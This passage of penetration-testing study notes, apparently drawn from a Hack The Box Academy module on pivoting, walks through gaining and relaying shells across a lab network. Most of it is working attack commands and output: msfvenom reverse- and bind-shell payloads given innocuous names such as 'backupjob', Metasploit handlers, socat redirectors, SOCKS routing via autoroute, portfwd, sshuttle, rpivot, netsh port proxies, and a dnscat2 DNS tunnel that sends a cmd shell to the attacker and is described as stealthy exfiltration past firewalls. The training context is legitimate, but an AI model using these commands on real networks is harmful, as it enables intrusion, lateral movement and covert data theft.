    > If all is set up properly, we will receive a Meterpreter shell pivoted via the Ubuntu server.

    > Meterpreter Session Established
        [*] Started HTTPS reverse handler on https://0.0.0.0:8000
        [!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
        [*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...
        [!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
        [*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1 ) at 2022-03-02 10:48:10 -0500
        
        meterpreter > shell
        Process 3236 created.
        Channel 1 created.
        Microsoft Windows [Version 10.0.17763.1637]
        (c) 2018 Microsoft Corporation. All rights reserved.
        
        C:\>

    > Our Meterpreter session should list that our incoming connection is from a local host itself (127.0.0.1) since we are receiving the connection over the local SSH socket, which created an outbound connection to the Ubuntu server. Issuing the netstat command can show us that the incoming connection is from the SSH service.

    > The below graphical representation provides an alternative way to understand this technique.
        (https://academy.hackthebox.com/storage/modules/158/44.png)
        

[+] Meterpreter Tunneling & Port Forwarding

    > Now let us consider a scenario where we have our Meterpreter shell access on the Ubuntu server (the pivot host), and we want to perform enumeration scans through the pivot host, but we would like to take advantage of the conveniences that Meterpreter sessions bring us. In such cases, we can still create a pivot with our Meterpreter session without relying on SSH port forwarding. We can create a Meterpreter shell for the Ubuntu server with the below command, which will return a shell on our attack host on port 8080.
    > Creating Payload for Ubuntu Pivot Host
        m1l0js@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

    > Before copying the payload over, we can start a multi/handler, also known as a Generic Payload Handler.
    > Configuring & Starting the multi/handler
        msf6 > use exploit/multi/handler

        [*] Using configured payload generic/shell_reverse_tcp
        msf6 exploit(multi/handler) > set lhost 0.0.0.0
        lhost => 0.0.0.0
        msf6 exploit(multi/handler) > set lport 8080
        lport => 8080
        msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
        payload => linux/x64/meterpreter/reverse_tcp
        msf6 exploit(multi/handler) > run
        [*] Started reverse TCP handler on 0.0.0.0:8080 

    > We can copy the backupjob binary file to the Ubuntu pivot host over SSH and execute it to gain a Meterpreter session.
    > Executing the Payload on the Pivot Host
        ubuntu@WebServer:~$ ls
        backupjob

        ubuntu@WebServer:~$ chmod +x backupjob 
        ubuntu@WebServer:~$ ./backupjob

    > We need to make sure the Meterpreter session is successfully established upon executing the payload.
    > Meterpreter Session Establishment
        
        [*] Sending stage (3020772 bytes) to 10.129.202.64
        [*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
        meterpreter > pwd
        
        /home/ubuntu

    > We know that the Windows target is on the 172.16.5.0/23 network. So assuming that the firewall on the Windows target is allowing ICMP requests, we would want to perform a ping sweep on this network. We can do that using Meterpreter with the ping_sweep module, which will generate the ICMP traffic from the Ubuntu host to the network 172.16.5.0/23.
    > Ping Sweep
        meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23 SESSION 1
        [*] Performing ping sweep for IP range 172.16.5.0/23

    > We could also perform a ping sweep using a for loop directly on a target pivot host that will ping any device in the network range we specify. Here are two helpful ping sweep for loop one-liners we could use for Linux-based and Windows-based pivot hosts.
    > Ping Sweep For Loop on Linux Pivot Hosts
        for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
    
    > Ping Sweep For Loop Using CMD
        for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
    
    > Ping Sweep Using PowerShell
        1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}

    > Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build it's arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.

    > There could be scenarios when a host's firewall blocks ping (ICMP), and the ping won't get us successful replies. In these cases, we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module socks_proxy to configure a local proxy on our attack host. We will configure the SOCKS proxy for SOCKS version 4a. This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.
    > Configuring MSF's SOCKS Proxy

        msf6 > use auxiliary/server/socks_proxy
        
        msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
        SRVPORT => 9050
        msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
        SRVHOST => 0.0.0.0
        msf6 auxiliary(server/socks_proxy) > set version 4a
        version => 4a
        msf6 auxiliary(server/socks_proxy) > run
        [*] Auxiliary module running as background job 0.
        
        [*] Starting the SOCKS proxy server
        msf6 auxiliary(server/socks_proxy) > options
        
        Module options (auxiliary/server/socks_proxy):
        
           Name     Current Setting  Required  Description
           ----     ---------------  --------  -----------
           SRVHOST  0.0.0.0          yes       The address to listen on
           SRVPORT  9050             yes       The port to listen on
           VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                                5)
        
        
        Auxiliary action:
        
           Name   Description
           ----   -----------
           Proxy  Run a SOCKS proxy server

    > Confirming Proxy Server is Running
        msf6 auxiliary(server/socks_proxy) > jobs
        
        Jobs
        ====
        
          Id  Name                           Payload  Payload opts
          --  ----                           -------  ------------
          0   Auxiliary: server/socks_proxy

    > After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host. We can add the below line at the end of our proxychains.conf file located at /etc/proxychains.conf if it isn't already there.
    > Adding a Line to proxychains.conf if Needed
        socks4 	127.0.0.1 9050

    > Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.
    > Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.
    > Creating Routes with AutoRoute
        msf6 > use post/multi/manage/autoroute
        
        msf6 post(multi/manage/autoroute) > set SESSION 1
        SESSION => 1
        msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
        SUBNET => 172.16.5.0
        msf6 post(multi/manage/autoroute) > run
        
        [!] SESSION may not be compatible with this module:
        [!]  * incompatible session platform: linux
        [*] Running module against 10.129.202.64
        [*] Searching for subnets to autoroute.
        [+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
        [+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
        [*] Post module execution completed

    > It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.
    > Creating Routes with AutoRoute
        meterpreter > run autoroute -s 172.16.5.0/23
        
        [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
        [!] Example: run post/multi/manage/autoroute OPTION=value [...]
        [*] Adding a route to 172.16.5.0/255.255.254.0...
        [+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
        [*] Use the -p option to list all active routes

    > After adding the necessary route(s) we can use the -p option to list the active routes to make sure our configuration is applied as expected.
    > Listing Active Routes with AutoRoute

        meterpreter > run autoroute -p
        
        [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
        [!] Example: run post/multi/manage/autoroute OPTION=value [...]
        
        Active Routing Table
        ====================
        
           Subnet             Netmask            Gateway
           ------             -------            -------
           10.129.0.0         255.255.0.0        Session 1
           172.16.4.0         255.255.254.0      Session 1
           172.16.5.0         255.255.254.0      Session 1

    > As you can see from the output above, the route has been added to the 172.16.5.0/23 network. We will now be able to use proxychains to route our Nmap traffic via our Meterpreter session.
    > Testing Proxy & Routing Functionality

        m1l0js@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
        
        ProxyChains-3.1 (http://proxychains.sf.net)
        Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
        Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 13:40 EST
        Initiating Parallel DNS resolution of 1 host. at 13:40
        Completed Parallel DNS resolution of 1 host. at 13:40, 0.12s elapsed
        Initiating Connect Scan at 13:40
        Scanning 172.16.5.19 [1 port]
        |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19 :3389-<><>-OK
        Discovered open port 3389/tcp on 172.16.5.19
        Completed Connect Scan at 13:40, 0.12s elapsed (1 total ports)
        Nmap scan report for 172.16.5.19 
        Host is up (0.12s latency).
        
        PORT     STATE SERVICE
        3389/tcp open  ms-wbt-server
        

* Port Forwarding
    > Port forwarding can also be accomplished using Meterpreter's portfwd module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.
    > Portfwd options

        meterpreter > help portfwd
        
        Usage: portfwd [-h] [add | delete | list | flush] [args]
        
        
        OPTIONS:
        
            -h        Help banner.
            -i <opt>  Index of the port forward entry to interact with (see the "list" command).
            -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
            -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
            -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
            -r <opt>  Forward: remote host to connect to.
            -R        Indicates a reverse port forward.

    > Creating Local TCP Relay

        meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
        [*] Local TCP relay created: :3300 <-> 172.16.5.19:3389

    > The above command requests the Meterpreter session to start a listener on our attack host's local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.
    > Connecting to Windows Target through localhost

        m1l0js@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123

    > We can use Netstat to view information about the session we recently established. From a defensive perspective, we may benefit from using Netstat if we suspect a host has been compromised. This allows us to view any sessions a host has established.
    > Netstat Output

        m1l0js@htb[/htb]$ netstat -antp
        tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp 

    > Meterpreter Reverse Port Forwarding

    > Similar to local port forwards, Metasploit can also perform reverse port forwarding with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port 1234 to our listener on port 8081.

    > We can create a reverse port forward on our existing shell from the previous scenario using the below command. This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081. We will also configure our listener to listen on port 8081 for a Windows shell.
    > Reverse Port Forwarding Rules
        meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
        [*] Local TCP relay created: 10.10.14.18:8081 <-> :1234

    > Configuring & Starting multi/handler
        meterpreter > bg
        
        [*] Backgrounding session 1...
        msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
        payload => windows/x64/meterpreter/reverse_tcp
        msf6 exploit(multi/handler) > set LPORT 8081 
        LPORT => 8081
        msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
        LHOST => 0.0.0.0
        msf6 exploit(multi/handler) > run
        
        [*] Started reverse TCP handler on 0.0.0.0:8081 

    > We can now create a reverse shell payload that will send a connection back to our Ubuntu server on 172.16.5.129:1234 when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to attack host's ip:8081 that we configured.
    > Generating the Windows Payload

        m1l0js@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234

    > Finally, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.
    > Establishing the Meterpreter session

        [*] Started reverse TCP handler on 0.0.0.0:8081 
        [*] Sending stage /home/m1l0js/Documents/testing/withmetas/backupscript.exe (200262 bytes) to 10.10.14.18
        [*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500
        
        meterpreter > shell
        Process 2336 created.
        Channel 1 created.
        Microsoft Windows [Version 10.0.17763.1637]
        (c) 2018 Microsoft Corporation. All rights reserved.
        
        C:\>


[+] Socat Redirection with a Reverse Shell

    > Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start socat on the Ubuntu server.
    > Starting Socat Listener
        ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

    > Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.
    > Creating the Windows Payload
        m1l0js@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
        //Or without metasploit ==> └─$ msfvenom -p windows/x64/shell_reverse_tcp lhost=172.16.5.129 lport=8080 -f exe -o badfile.exe           


    > Keep in mind that we must transfer this payload to the Windows host. We can use some of the same techniques used in previous sections to do so.
    > Configuring & Starting the multi/handler
        msf6 > use exploit/multi/handler
        
        [*] Using configured payload generic/shell_reverse_tcp
        msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
        payload => windows/x64/meterpreter/reverse_https
        msf6 exploit(multi/handler) > set lhost 0.0.0.0
        lhost => 0.0.0.0
        msf6 exploit(multi/handler) > set lport 80
        lport => 80
        msf6 exploit(multi/handler) > run
        
        [*] Started HTTPS reverse handler on https://0.0.0.0:80

    > We can test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time.
    > Establishing the Meterpreter Session
        [!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
        [*] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...
        [!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
        [*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1 ) at 2022-03-07 11:08:10 -0500
        
        meterpreter > getuid
        Server username: INLANEFREIGHT\victor


* Socat Redirection with a Bind Shell

    > Similar to our socat's reverse shell redirector, we can also create a socat bind shell redirector. This is different from reverse shells that connect back from the Windows server to the Ubuntu server and get redirected to our attack host. In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target. The below figure should explain the pivot in a much better way.
        (https://academy.hackthebox.com/storage/modules/158/55.png)
    > We can create a bind shell using msfvenom with the below command.
    > Creating the Windows Payload
        m1l0js@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
        //Without Metasploit ==> └─$ msfvenom -p windows/x64/shell_bind_tcp  lport=8443 -f exe -o malisimo.exe

    > We can start a socat bind shell listener, which listens on port 8080 and forwards packets to Windows server 8443.
    > Starting Socat Bind Shell Listener
        ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
    > Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)
    > Configuring & Starting the Bind multi/handler
        msf6 > use exploit/multi/handler

        [*] Using configured payload generic/shell_reverse_tcp
        msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
        payload => windows/x64/meterpreter/bind_tcp
        msf6 exploit(multi/handler) > set RHOST 10.129.202.64
        RHOST => 10.129.202.64
        msf6 exploit(multi/handler) > set LPORT 8080
        LPORT => 8080
        msf6 exploit(multi/handler) > run
        
        [*] Started bind TCP handler against 10.129.202.64:8080
     
    > Without metasploit └─$ socat TCP4:10.129.240.217:8080 -

    > We can see a bind handler connected to a stage request pivoted via a socat listener upon executing the payload on a Windows target.
    > Establishing Meterpreter Session

        [*] Sending stage (200262 bytes) to 10.129.202.64
        [*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500
        
        meterpreter > getuid
        Server username: INLANEFREIGHT\victor


[+] Pivoting around obstacles

* SSH for Windows: plink.exe

    > Plink(https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html), short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed. Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies. Before the Fall of 2018(https://docs.microsoft.com/en-us/windows-server/administration/openssh/openssh_overview), Windows did not have a native ssh client included, so users would have to install their own. The tool of choice for many a sysadmin who needed to connect to other hosts was PuTTY (https://www.putty.org/)
    > Imagine that we are on a pentest and gain access to a Windows machine. We quickly enumerate the host and its security posture and determine that it is moderately locked down. We need to use this host as a pivot point, but it is unlikely that we will be able to pull our own tools onto the host without being exposed. Instead, we can live off the land and use what is already there. If the host is older and PuTTY is present (or we can find a copy on a file share), Plink can be our path to victory. We can use it to create our pivot and potentially avoid detection a little longer.

    > That is just one potential scenario where Plink could be beneficial. We could also use Plink if we use a Windows system as our primary attack host instead of a Linux-based system.
    > Getting To Know Plink
    > In the below image, we have a Windows-based attack host.
        (https://academy.hackthebox.com/storage/modules/158/66.png)
    > The Windows attack host starts a plink.exe process with the below command-line arguments to start a dynamic port forward over the Ubuntu server. This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050.
    > Using Plink.exe

        plink -D 9050 ubuntu@10.129.15.50

    > Another Windows-based tool called Proxifier(https://www.proxifier.com/) can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.

    > After configuring the SOCKS server for 127.0.0.1 and port 9050, we can directly start mstsc.exe to start an RDP session with a Windows target that allows RDP connections.



[+] SSH Pivoting with Sshuttle
    > Sshuttle(https://github.com/sshuttle/sshuttle) is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. Sshuttle can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle using the example later in this section.

    > One interesting usage of sshuttle is that we don't need to use proxychains to connect to the remote hosts. Let's install sshuttle via our Ubuntu pivot host and configure it to connect to the Windows host via RDP.
    > Installing sshuttle
        sudo apt-get install sshuttle
    > To use sshuttle, we specify the option -r to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.
    > Running sshuttle
        m1l0js@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
        
        Starting sshuttle proxy (version 1.1.0).
        c : Starting firewall manager with command: ['/usr/bin/python3', '/usr/local/lib/python3.9/dist-packages/sshuttle/__main__.py', '-v', '--method', 'auto', '--firewall']
        fw: Starting firewall with Python version 3.9.2
        fw: ready method name nat.
        c : IPv6 enabled: Using default IPv6 listen address ::1
        c : Method: nat
        c : IPv4: on
        c : IPv6: on
        c : UDP : off (not available with nat method)
        c : DNS : off (available)
        c : User: off (available)
        c : Subnets to forward through remote host (type, IP, cidr mask width, startPort, endPort):
        c :   (<AddressFamily.AF_INET: 2>, '172.16.5.0', 32, 0, 0)
        c : Subnets to exclude from forwarding:
        c :   (<AddressFamily.AF_INET: 2>, '127.0.0.1', 32, 0, 0)
        c :   (<AddressFamily.AF_INET6: 10>, '::1', 128, 0, 0)
        c : TCP redirector listening on ('::1', 12300, 0, 0).
        c : TCP redirector listening on ('127.0.0.1', 12300).
        c : Starting client with Python version 3.9.2
        c : Connecting to server...
        ubuntu@10.129.202.64's password: 
         s: Running server on remote host with /usr/bin/python3 (version 3.8.10)
         s: latency control setting = True
         s: auto-nets:False
        c : Connected to server.
        fw: setting up.
        fw: ip6tables -w -t nat -N sshuttle-12300
        fw: ip6tables -w -t nat -F sshuttle-12300
        fw: ip6tables -w -t nat -I OUTPUT 1 -j sshuttle-12300
        fw: ip6tables -w -t nat -I PREROUTING 1 -j sshuttle-12300
        fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
        fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN --dest ::1/128 -p tcp
        fw: iptables -w -t nat -N sshuttle-12300
        fw: iptables -w -t nat -F sshuttle-12300
        fw: iptables -w -t nat -I OUTPUT 1 -j sshuttle-12300
        fw: iptables -w -t nat -I PREROUTING 1 -j sshuttle-12300
        fw: iptables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
        fw: iptables -w -t nat -A sshuttle-12300 -j RETURN --dest 127.0.0.1/32 -p tcp
        fw: iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 172.16.5.0/32 -p tcp --to-ports 12300

    > With this command, sshuttle creates an entry in our iptables to redirect all traffic to the 172.16.5.0/23 network through the pivot host.
    > Traffic Routing through iptables Routes

        m1l0js@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn
        
        Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
        Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 11:16 EST
        Host is up.
        
        PORT     STATE SERVICE       VERSION
        3389/tcp open  ms-wbt-server Microsoft Terminal Services
        | rdp-ntlm-info: 
        |   Target_Name: INLANEFREIGHT
        |   NetBIOS_Domain_Name: INLANEFREIGHT
        |   NetBIOS_Computer_Name: DC01
        |   DNS_Domain_Name: inlanefreight.local
        |   DNS_Computer_Name: DC01.inlanefreight.local
        |   Product_Version: 10.0.17763
        |_  System_Time: 2022-08-14T02:58:25+00:00
        |_ssl-date: 2022-08-14T02:58:25+00:00; +7s from scanner time.
        | ssl-cert: Subject: commonName=DC01.inlanefreight.local
        | Issuer: commonName=DC01.inlanefreight.local
        | Public Key type: rsa
        | Public Key bits: 2048
        | Signature Algorithm: sha256WithRSAEncryption
        | Not valid before: 2022-08-13T02:51:48
        | Not valid after:  2023-02-12T02:51:48
        | MD5:   58a1 27de 5f06 fea6 0e18 9a02 f0de 982b
        |_SHA-1: f490 dc7d 3387 9962 745a 9ef8 8c15 d20e 477f 88cb
        Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    > We can now use any tool directly without using proxychains.


[+] Web Server pivoting with Rpivot
    > Rpivot(https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (172.16.5.135), and we want to access that using the rpivot proxy.
        (https://academy.hackthebox.com/storage/modules/158/77.png)

    > We can start our rpivot SOCKS proxy server using the below command to allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections.
    > Cloning rpivot
        m1l0js@htb[/htb]$ sudo git clone https://github.com/klsecservices/rpivot.git

    > Installing Python2.7
        m1l0js@htb[/htb]$ sudo apt-get install python2.7

    > We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using server.py.
    > Running server.py from the Attack Host
        m1l0js@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

    > Before running client.py we will need to transfer rpivot to the target. We can do this using this SCP command:
    > Transfering rpivot to the Target
        m1l0js@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/

    > Running client.py from Pivot Target
        ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
        Backconnecting to server 10.10.14.18 port 9999
        //Confirming Connection is Established
        New connection from host 10.129.202.64, source port 35226

    > We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.
    > Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.
    > Browsing to the Target Webserver using Proxychains
        proxychains firefox-esr 172.16.5.135:80
    
    > Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication(https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a) configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:
        > Connecting to a Web Server using HTTP-Proxy & NTLM Auth
            python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>


[+] Port forwarding with Windows Netsh
    > Netsh(https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use Netsh for:
        - Finding routes
        - Viewing the firewall configuration
        - Adding proxies
        - Creating port forwarding rules
    > Let's take an example of the below scenario where our compromised host is a Windows 10-based IT admin's workstation (10.129.15.150,172.16.5.25). Keep in mind that it is possible on an engagement that we may gain access to an employee's workstation through methods such as social engineering and phishing. This would allow us to pivot further from within the network the workstation is in.
        (https://academy.hackthebox.com/storage/modules/158/88.png)
    > We can use netsh.exe to forward all data received on a specific port (say 8080) to a remote host on a remote port. This can be performed using the below command.
    > Using Netsh.exe to Port Forward
        C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
    > Verifying Port Forward
        C:\Windows\system32> netsh.exe interface portproxy show v4tov4
        
        Listen on ipv4:             Connect to ipv4:
        
        Address         Port        Address         Port
        --------------- ----------  --------------- ----------
        10.129.42.198   8080        172.16.5.25     3389

    > After configuring the portproxy on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.


[!] Branching Out Our Tunnels
[+] DNS Tunneling with dnscat2
    > Dnscat2(https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted Command-&-Control (C&C or C2) channel and sends data inside TXT records within the DNS protocol. Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. However, with dnscat2, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.
    > Setting Up & Using dnscat2
    > If dnscat2 is not already set up on our attack host, we can do so using the following commands:
    > Cloning dnscat2 and Setting Up the Server
        m1l0js@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git
        cd dnscat2/server/
        gem install bundler
        bundle install

    > We can then start the dnscat2 server by executing the dnscat2 file.
    > Starting the dnscat2 server

        m1l0js@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

        New window created: 0
        dnscat2> New window created: crypto-debug
        Welcome to dnscat2! Some documentation may be out of date.
        
        auto_attach => false
        history_size (for new windows) => 1000
        Security policy changed: All connections must be encrypted
        New window created: dns1
        Starting Dnscat2 DNS server on 10.10.14.18:53
        [domains = inlanefreight.local]...

        Assuming you have an authoritative DNS server, you can run
        the client anywhere with the following (--secret is optional):
        
          ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local
        
        To talk directly to the server without a domain name, run:
        
          ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21
        
        Of course, you have to figure out <server> yourself! Clients
        will connect directly on UDP port 53.

    > After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. We can use the client with the dnscat2 project or use dnscat2-powershell(https://github.com/lukebaggett/dnscat2-powershell), a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server. We can clone the project containing the client file to our attack host, then transfer it to the target.
    > Cloning dnscat2-powershell to the Attack Host
        m1l0js@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git

    > Once the dnscat2.ps1 file is on the target we can import it and run associated cmd-lets.
    > Importing dnscat2.ps1
        PS C:\htb> Import-Module .\dnscat2.ps1

    > After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.
    > Importing dnscat2.ps1
        PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 

    > We must use the pre-shared secret (-PreSharedSecret) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.
    > Confirming Session Establishment
        New window created: 1
        Session 1 Security: ENCRYPTED AND VERIFIED!
        (the security depends on the strength of your pre-shared secret!)
        
        dnscat2>

    > We can list the options we have with dnscat2 by entering ? at the prompt.
    > Listing dnscat2 Options
        dnscat2> ?
        
        Here is a list of commands (use -h on any of them for additional help):
        * echo
        * help
        * kill
        * quit
        * set
        * start
        * stop
        * tunnels
        * unset
        * window
        * windows

